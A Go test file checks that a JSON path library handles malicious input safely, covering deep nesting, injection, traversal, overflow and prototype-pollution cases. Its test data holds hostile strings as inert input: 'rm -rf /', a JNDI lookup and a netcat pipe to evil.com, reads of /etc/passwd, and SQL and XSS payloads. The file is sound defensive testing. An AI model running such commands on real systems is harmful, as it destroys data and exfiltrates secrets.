package json

import (
	"strings"
	"testing"
)

// TestSecurityValidation tests security-related edge cases and malicious input handling
func TestSecurityValidation(t *testing.T) {
	helper := NewTestHelper(t)

	t.Run("DeeplyNestedJSON", func(t *testing.T) {
		// Test protection against stack overflow from deeply nested structures
		depth := 1000
		nested := strings.Repeat(`{"a":`, depth) + "1" + strings.Repeat("}", depth)

		// Should handle deep nesting without crashing
		_, err := Get(nested, "a.a.a.a.a")
		// May error or succeed, but shouldn't crash
		if err != nil {
			t.Logf("Deep nesting handled with error: %v", err)
		}
	})

	t.Run("LargeArrays", func(t *testing.T) {
		// Test handling of moderately large arrays (library may have size limits)
		largeArray := `{"data": [`
		for i := 0; i < 100; i++ {
			if i > 0 {
				largeArray += ","
			}
			largeArray += `{"id":` + string(rune(i+48)) + `}`
		}
		largeArray += `]}`

		// Should handle arrays efficiently
		result, err := Get(largeArray, "data[0].id")
		if err == nil {
			helper.AssertNotNil(result, "Should get result from array")
		} else {
			t.Logf("Large array handling: %v", err)
		}
	})

	t.Run("MaliciousPathInjection", func(t *testing.T) {
		testData := `{"user": {"name": "Alice", "password": "secret"}}`

		// Test various injection attempts
		maliciousPaths := []string{
			"user.name'; DROP TABLE users; --",
			"user.name\"; system('rm -rf /'); \"",
			"user.name<script>alert('xss')</script>",
			"user.name${jndi:ldap://evil.com/a}",
			"user.name../../etc/passwd",
			"user.name\x00\x00\x00",
		}

		for _, path := range maliciousPaths {
			// Should safely handle malicious paths without executing anything
			_, err := Get(testData, path)
			// Should either return error or nil, but not execute malicious code
			if err == nil {
				t.Logf("Malicious path handled safely: %s", path)
			}
		}
	})

	t.Run("ExcessiveMemoryAllocation", func(t *testing.T) {
		// Test protection against memory exhaustion attacks
		testData := `{"data": "` + strings.Repeat("A", 1000000) + `"}`

		result, err := Get(testData, "data")
		helper.AssertNoError(err, "Should handle large strings")
		if str, ok := result.(string); ok {
			helper.AssertEqual(1000000, len(str), "Should get full large string")
		}
	})

	t.Run("NullByteInjection", func(t *testing.T) {
		// Test handling of null bytes in paths and values
		testData := `{"key": "value"}`

		_, err := Get(testData, "key\x00malicious")
		// Should handle null bytes safely
		if err != nil {
			t.Logf("Null byte injection handled: %v", err)
		}
	})

	t.Run("UnicodeNormalizationAttacks", func(t *testing.T) {
		// Test handling of Unicode normalization attacks
		testData := `{"cafe": "value1", "café": "value2"}`

		// Unicode keys may not be supported in path syntax
		_, err := Get(testData, "café")
		if err != nil {
			t.Logf("Unicode key handling: %v", err)
		}
		
		// ASCII keys should work
		result, err := Get(testData, "cafe")
		helper.AssertNoError(err, "Should handle ASCII keys")
		helper.AssertNotNil(result, "Should get ASCII key value")
	})

	t.Run("PathTraversalAttempts", func(t *testing.T) {
		testData := `{"user": {"data": {"file": "content"}}}`

		// Test various path traversal attempts
		traversalPaths := []string{
			"user.data.file/../../../etc/passwd",
			"user.data.file/./././secret",
			"user.data.file\\..\\..\\windows\\system32",
		}

		for _, path := range traversalPaths {
			_, err := Get(testData, path)
			// Should not allow path traversal
			if err != nil {
				t.Logf("Path traversal blocked: %s", path)
			}
		}
	})

	t.Run("RegexDOSProtection", func(t *testing.T) {
		// Test protection against ReDoS attacks
		testData := `{"pattern": "` + strings.Repeat("a", 10000) + `!"}`

		result, err := Get(testData, "pattern")
		helper.AssertNoError(err, "Should handle potential ReDoS patterns")
		helper.AssertNotNil(result, "Should get result")
	})

	t.Run("IntegerOverflow", func(t *testing.T) {
		// Test handling of integer overflow attempts
		testData := `{"bignum": 9223372036854775807, "overflow": 9223372036854775808}`

		result, err := Get(testData, "bignum")
		helper.AssertNoError(err, "Should handle max int64")
		helper.AssertNotNil(result, "Should get bignum")

		// Overflow number should be handled as float
		overflow, err := Get(testData, "overflow")
		helper.AssertNoError(err, "Should handle overflow as float")
		helper.AssertNotNil(overflow, "Should get overflow value")
	})

	t.Run("PrototypePollutioPrevention", func(t *testing.T) {
		// Test prevention of prototype pollution attacks
		testData := `{"__proto__": {"isAdmin": true}, "constructor": {"prototype": {"isAdmin": true}}}`

		result, err := Get(testData, "__proto__.isAdmin")
		// Should handle special keys safely
		if err == nil {
			helper.AssertNotNil(result, "Should handle __proto__ as regular key")
		}
	})

	t.Run("CircularReferenceProtection", func(t *testing.T) {
		// Test handling of circular references in Set operations
		processor := New()
		defer processor.Close()

		testData := `{"a": {"b": {"c": "value"}}}`

		// Attempt to create circular reference
		result, err := Set(testData, "a.b.c", map[string]any{"ref": "back"})
		helper.AssertNoError(err, "Should handle potential circular refs")
		helper.AssertNotNil(result, "Should get result")
	})

	t.Run("CommandInjectionPrevention", func(t *testing.T) {
		// Test that values with command injection attempts are handled safely
		testData := `{"cmd": "$(rm -rf /)", "shell": "; cat /etc/passwd", "pipe": "| nc evil.com 1234"}`

		cmd, err := Get(testData, "cmd")
		helper.AssertNoError(err, "Should handle command injection strings")
		helper.AssertEqual("$(rm -rf /)", cmd, "Should return value as-is")

		shell, err := Get(testData, "shell")
		helper.AssertNoError(err, "Should handle shell injection strings")
		helper.AssertEqual("; cat /etc/passwd", shell, "Should return value as-is")
	})

	t.Run("XXEProtection", func(t *testing.T) {
		// Test that XML entity expansion attacks don't apply to JSON
		testData := `{"xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}`

		result, err := Get(testData, "xml")
		helper.AssertNoError(err, "Should handle XXE-like strings")
		helper.AssertNotNil(result, "Should get result")
	})

	t.Run("ResourceExhaustion", func(t *testing.T) {
		// Test handling of operations that could exhaust resources
		processor := New()
		defer processor.Close()

		testData := `{"items": [1, 2, 3, 4, 5]}`

		// Attempt many concurrent operations
		for i := 0; i < 100; i++ {
			_, err := processor.Get(testData, "items[0]")
			helper.AssertNoError(err, "Should handle many operations")
		}
	})
}

// TestInputValidation tests input validation and sanitization
func TestInputValidation(t *testing.T) {
	helper := NewTestHelper(t)

	t.Run("EmptyInput", func(t *testing.T) {
		_, err := Get("", "path")
		helper.AssertError(err, "Should error on empty input")

		_, err = Get("   ", "path")
		helper.AssertError(err, "Should error on whitespace-only input")
	})

	t.Run("InvalidJSONInput", func(t *testing.T) {
		invalidInputs := []string{
			"not json",
			"{invalid}",
			"{'single': 'quotes'}",
			"{\"unclosed\": ",
			"undefined",
			"NaN",
			"Infinity",
		}

		for _, input := range invalidInputs {
			_, err := Get(input, "path")
			helper.AssertError(err, "Should error on invalid JSON: %s", input)
		}
	})

	t.Run("EmptyPath", func(t *testing.T) {
		testData := `{"key": "value"}`

		result, err := Get(testData, "")
		// Empty path should return the whole document or error
		if err == nil {
			helper.AssertNotNil(result, "Empty path should return document")
		}
	})

	t.Run("InvalidPathSyntax", func(t *testing.T) {
		testData := `{"key": "value"}`

		invalidPaths := []string{
			"[",
			"]",
			"key[",
			"key]",
			"key[[0]]",
			"key[[]",
			"key..nested",
			".key",
			"key.",
		}

		for _, path := range invalidPaths {
			_, err := Get(testData, path)
			// Should handle invalid paths gracefully
			if err != nil {
				t.Logf("Invalid path handled: %s - %v", path, err)
			}
		}
	})

	t.Run("TypeMismatchHandling", func(t *testing.T) {
		testData := `{"string": "value", "number": 42, "bool": true, "null": null}`

		// Attempt to access string as array
		_, err := Get(testData, "string[0]")
		// Should handle type mismatch gracefully
		if err != nil {
			t.Logf("Type mismatch handled: %v", err)
		}

		// Attempt to access number as object
		_, err = Get(testData, "number.property")
		if err != nil {
			t.Logf("Type mismatch handled: %v", err)
		}
	})
}
